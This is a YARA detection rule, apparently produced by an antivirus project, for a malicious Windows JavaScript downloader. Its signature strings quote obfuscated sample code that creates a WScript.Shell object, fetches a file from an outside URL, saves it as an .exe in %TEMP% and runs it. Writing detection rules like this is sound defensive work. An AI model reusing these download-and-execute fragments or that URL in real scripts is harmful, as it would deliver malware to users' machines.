rule sig_20160412_c88db9887c36060991d0faa8e703bc06 {
  meta:
    description = "datamaliciousorder - file 20160412_c88db9887c36060991d0faa8e703bc06.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a49d2880e2a1baef2840a6f53f0754864556d3e87c56c87079558c3ca0047759"

  strings:
    $s1  = "function RlGga(NpKjp, PeQzw){XfxMu = XfxMu * 1; return NpKjp - PeQzw;};" fullword ascii
    $s2  = "var ZqFp = function RmpIbn() {return WScript[IziXyq](\"WScript\"+\".Shell\");}(), RxNuw = 11;" fullword ascii
    $s3  = "if (HhFgd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "HhFgd[LlDwq](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s5  = "function RlXuy() {return ZqFp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"a1SBbcTIubQ.ex\" + \"e\";};" fullword ascii
    $s6  = "function DnOw(){return KyjHv + \"\";};" fullword ascii
    $s7  = "function PwmZxq() {return ((DvvIn == true) && (DvvIn == TnIz)) ? 1 : XfxMu;};" fullword ascii
    $s8  = "function BaFug(GlKtm) {var GewCfo = (1, 2, 3, 4, 5, GlKtm); return GewCfo;};" fullword ascii
    $s9  = "}while (XfaCi);" fullword ascii
    $s10 = "DvvIn = true; " fullword ascii
    $s11 = "var TnIz = false;" fullword ascii
    $s12 = "var DvvIn = false;" fullword ascii
    $s13 = "TnIz = true; " fullword ascii
    $s14 = "function WhnDj()" fullword ascii
    $s15 = "var ImPg = new this[\"Date\"]();" fullword ascii
    $s16 = "var GyzPo = false;" fullword ascii
    $s17 = "function NuTxo(WlUs){ZqFp[\"R\"+\"un\"](WlUs, XfxMu, XfxMu);};" fullword ascii
    $s18 = "function CiSo(){return IziXyq;};" fullword ascii
    $s19 = "function YjCtf(){return 23;};" fullword ascii
    $s20 = "return RlGga(GgrLm, ZoCd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}